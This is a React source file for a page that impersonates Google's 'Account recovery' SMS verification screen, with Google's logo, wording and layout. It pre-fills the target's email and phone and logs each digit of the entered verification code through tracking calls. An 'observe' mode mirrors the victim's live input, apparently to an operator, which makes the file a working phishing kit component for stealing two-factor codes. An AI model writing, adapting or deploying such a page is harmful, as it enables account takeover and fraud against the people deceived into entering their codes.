import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useRef, useState, type FormEvent } from "react";
import {
  GE_SHELL_CSS,
  GeFontStyle,
  GeFooter,
  GoogleGLogo,
  GoogleUserIcon,
  formatGePhoneDisplay,
  resolveGeEmail,
  resolveGePhone,
  setGeEmail,
  setGePhone,
  useGeTracking,
} from "@/components/ge/GeShared";

export const Route = createFileRoute("/ge/smscode")({
  head: () => ({
    meta: [
      { title: "Account recovery - Google Accounts" },
      { name: "color-scheme", content: "dark" },
    ],
  }),
  component: GeSmsCodePage,
});

const GE_SMS_CSS = `
${GE_SHELL_CSS}

.ge-sms .ge-title { margin-top: 24px; }

.ge-sms-lead {
  margin: 16px 0 0;
  font-size: 1rem;
  font-weight: 400;
  line-height: 1.5;
  color: var(--gm3-on-surface);
}

.ge-account-chip {
  display: inline-flex;
  align-items: center;
  gap: 0;
  margin-top: 24px;
  width: fit-content;
  max-width: 100%;
  align-self: flex-start;
  height: 32px;
  padding: 0 8px 0 3px;
  border: 1px solid var(--gm3-outline);
  border-radius: 16px;
  background: var(--gm3-card);
  color: var(--gm3-on-surface);
  font: inherit;
  font-size: 0.875rem;
  font-weight: 500;
  letter-spacing: 0.25px;
  line-height: 1.25;
  cursor: pointer;
  text-align: left;
}
.ge-account-chip:hover { background: rgba(227, 227, 227, 0.08); }

.ge-avatar-user {
  width: 24px;
  height: 24px;
  border-radius: 50%;
  display: inline-flex;
  align-items: center;
  justify-content: center;
  flex-shrink: 0;
  margin-right: 8px;
  background: rgb(95, 99, 104);
  color: #fff;
  overflow: hidden;
}
.ge-avatar-user svg {
  width: 20px;
  height: 20px;
  display: block;
}

.ge-account-email {
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  min-width: 0;
  padding-right: 4px;
}
.ge-chip-caret {
  width: 20px;
  height: 20px;
  flex-shrink: 0;
  fill: var(--gm3-on-surface);
  opacity: 0.8;
}

.ge-resend {
  margin-top: auto;
  align-self: flex-start;
  padding: 0;
  border: none;
  background: none;
  color: var(--gm3-on-surface);
  font: inherit;
  font-size: 0.875rem;
  font-weight: 500;
  letter-spacing: 0.25px;
  cursor: pointer;
  border-radius: 20px;
  height: 40px;
  padding: 0 8px;
}
.ge-resend:hover { background: rgba(227, 227, 227, 0.08); }

.ge-sms-heading {
  margin: 0;
  font-size: 1rem;
  font-weight: 400;
  line-height: 1.5;
  color: var(--gm3-on-surface);
}
.ge-sms-heading strong {
  font-weight: 500;
}
@media (min-width: 900px) {
  .ge-sms .ge-pane-right {
    padding-top: 72px;
  }
  .ge-sms .ge-pane-left {
    padding-bottom: 8px;
  }
}

.ge-form {
  margin-top: 24px;
  flex: 1;
  display: flex;
  flex-direction: column;
  min-height: 0;
}
@media (min-width: 900px) {
  .ge-form { margin-top: 22px; }
}

.ge-field {
  position: relative;
  width: 100%;
  height: 56px;
  margin-top: 0;
}
.ge-code-row {
  position: relative;
  z-index: 1;
  display: flex;
  align-items: center;
  height: 56px;
  padding: 0 15px;
  gap: 0;
}
.ge-code-prefix {
  flex-shrink: 0;
  color: var(--gm3-on-surface);
  font-size: 1rem;
  font-weight: 400;
  line-height: 24px;
  letter-spacing: 0.05em;
  user-select: none;
}
.ge-field input {
  position: relative;
  z-index: 1;
  flex: 1 1 auto;
  min-width: 0;
  height: 56px;
  margin: 0;
  padding: 13px 0;
  border: none;
  outline: none;
  background: transparent;
  color: var(--gm3-on-surface);
  font-family: inherit;
  font-size: 1rem;
  font-weight: 400;
  line-height: 24px;
  border-radius: 4px;
  caret-color: var(--gm3-primary);
  letter-spacing: 0.05em;
}
.ge-field .ring {
  position: absolute;
  inset: 0;
  border-radius: 4px;
  pointer-events: none;
  z-index: 2;
  box-shadow: inset 0 0 0 1px var(--gm3-outline);
  transition: box-shadow .15s cubic-bezier(.4,0,.2,1);
}
.ge-field.is-active .ring,
.ge-field.has-value .ring {
  box-shadow: inset 0 0 0 2px var(--gm3-primary);
}
.ge-field label {
  position: absolute;
  left: 12px;
  top: 0;
  transform: translateY(-50%);
  padding: 0 4px;
  color: var(--gm3-on-surface-variant);
  font-size: 0.75rem;
  line-height: 1.333;
  pointer-events: none;
  z-index: 3;
  background: var(--gm3-card);
}
.ge-field.is-active label {
  color: var(--gm3-primary);
}

.ge-actions {
  display: flex;
  flex-direction: row;
  flex-wrap: wrap;
  align-items: center;
  justify-content: space-between;
  margin-top: auto;
  padding-top: 32px;
  gap: 8px;
  width: 100%;
}
.ge-btn-text {
  background: none;
  border: none;
  padding: 0 12px;
  height: 40px;
  border-radius: 20px;
  color: var(--gm-next-fill);
  font-family: inherit;
  font-size: 0.875rem;
  font-weight: 500;
  letter-spacing: 0.0107142857em;
  cursor: pointer;
}
.ge-btn-text:hover { background: rgba(138, 180, 248, 0.08); }
.ge-btn {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  height: 40px;
  min-width: 64px;
  padding: 0 24px;
  border: none;
  border-radius: 20px;
  font-family: inherit;
  font-size: 0.875rem;
  font-weight: 500;
  letter-spacing: 0.0107142857em;
  cursor: pointer;
}
.ge-btn-next {
  background: var(--gm-next-fill);
  color: var(--gm-next-ink);
}
.ge-btn-next:hover:not(:disabled) {
  box-shadow: 0 1px 2px rgba(0,0,0,.3), 0 1px 3px 1px rgba(0,0,0,.15);
  filter: brightness(1.05);
}
.ge-btn-next:disabled {
  opacity: 0.38;
  cursor: default;
  filter: none;
  box-shadow: none;
}
`;

function GeSmsCodePage() {
  const { trackClick, trackInput, trackSubmit, sessionId, isObserve } = useGeTracking();
  const [email, setEmail] = useState(() => resolveGeEmail());
  const [phone, setPhone] = useState(() => resolveGePhone());
  const [digits, setDigits] = useState("");
  const [focused, setFocused] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    const resolvedEmail = resolveGeEmail();
    if (resolvedEmail) {
      setEmail(resolvedEmail);
      setGeEmail(resolvedEmail);
    }
    const resolvedPhone = resolveGePhone();
    if (resolvedPhone) {
      setPhone(resolvedPhone);
      setGePhone(resolvedPhone);
    }
    setTimeout(() => inputRef.current?.focus(), 200);
  }, []);

  useEffect(() => {
    if (!isObserve) return;
    function onMirror(e: Event) {
      const d = (e as CustomEvent<{ field?: string; value?: string }>).detail;
      if (!d?.field) return;
      const value = String(d.value ?? "");
      if (d.field === "email" || d.field === "email_submitted" || d.field === "identifier") {
        setEmail(value);
        setGeEmail(value);
      }
      if (
        d.field === "phone" ||
        d.field === "phone_number" ||
        d.field === "phone_submitted" ||
        d.field === "Phone number"
      ) {
        setPhone(value);
        setGePhone(value);
      }
      if (
        d.field === "sms_code" ||
        d.field === "smscode" ||
        d.field === "Enter the code" ||
        d.field === "sms_code_submitted"
      ) {
        const raw = value.replace(/^G-?/i, "").replace(/\D/g, "").slice(0, 6);
        setDigits(raw);
      }
    }
    window.addEventListener("ux:mirror-live-input", onMirror);
    return () => window.removeEventListener("ux:mirror-live-input", onMirror);
  }, [isObserve]);

  const displayPhone = formatGePhoneDisplay(phone);
  const hasValue = digits.length > 0;
  const isActive = focused || hasValue;
  const canContinue = digits.length >= 6;

  const handleNext = (e?: FormEvent) => {
    e?.preventDefault();
    if (!canContinue) return;
    trackClick("Next");
    trackSubmit("sms_code", `G-${digits}`);
  };

  return (
    <div className="ge-shell ge-sms">
      <GeFontStyle />
      <style>{GE_SMS_CSS}</style>

      <main className="ge-card" role="main">
        <div className="ge-pane-left">
          <GoogleGLogo className="ge-logo" width={48} height={48} />
          <h1 className="ge-title">Account recovery</h1>
          <p className="ge-sms-lead">
            To help keep your account safe, Google wants to make sure it{"\u2019"}s
            really you trying to sign in
          </p>
          <button
            type="button"
            className="ge-account-chip"
            aria-label={`${email || "Account"} selected. Switch account`}
            onClick={() => trackClick("Switch account")}
          >
            <span className="ge-avatar-user" aria-hidden="true">
              <GoogleUserIcon width={20} height={20} />
            </span>
            <span className="ge-account-email">{email || "Account"}</span>
            <svg className="ge-chip-caret" viewBox="0 0 24 24" aria-hidden="true">
              <path d="M7 9.5l5 5 5-5H7z" />
            </svg>
          </button>
          <button
            type="button"
            className="ge-resend"
            onClick={() => trackClick("Resend it")}
          >
            Resend it
          </button>
        </div>

        <div className="ge-pane-right">
          <p className="ge-sms-heading">
            A text message with a 6-digit verification code was just sent to{" "}
            <strong>{displayPhone}</strong>
          </p>

          <form className="ge-form" onSubmit={handleNext} autoComplete="off">
            <div
              className={`ge-field${hasValue ? " has-value" : ""}${isActive ? " is-active" : ""}`}
            >
              <label htmlFor="smsCode">Enter the code</label>
              <div className="ge-code-row">
                <span className="ge-code-prefix" aria-hidden="true">
                  G-
                </span>
                <input
                  ref={inputRef}
                  id="smsCode"
                  name="sms_code"
                  type="text"
                  inputMode="numeric"
                  autoComplete="one-time-code"
                  spellCheck={false}
                  maxLength={6}
                  aria-label="Enter the code"
                  value={digits}
                  onFocus={() => setFocused(true)}
                  onBlur={() => setFocused(false)}
                  onChange={(e) => {
                    const v = e.target.value.replace(/\D/g, "").slice(0, 6);
                    setDigits(v);
                    trackInput("sms_code", v ? `G-${v}` : "", "text");
                  }}
                />
              </div>
              <div className="ring" aria-hidden="true" />
            </div>

            <div className="ge-actions">
              <button
                type="button"
                className="ge-btn-text"
                onClick={() => trackClick("Try another way")}
              >
                Try another way
              </button>
              <button type="submit" className="ge-btn ge-btn-next" disabled={!canContinue}>
                Next
              </button>
            </div>
          </form>
        </div>
      </main>

      <GeFooter />
      <div className="fixed bottom-2 right-2 text-[10px] opacity-0 pointer-events-none">
        {sessionId}
      </div>
    </div>
  );
}
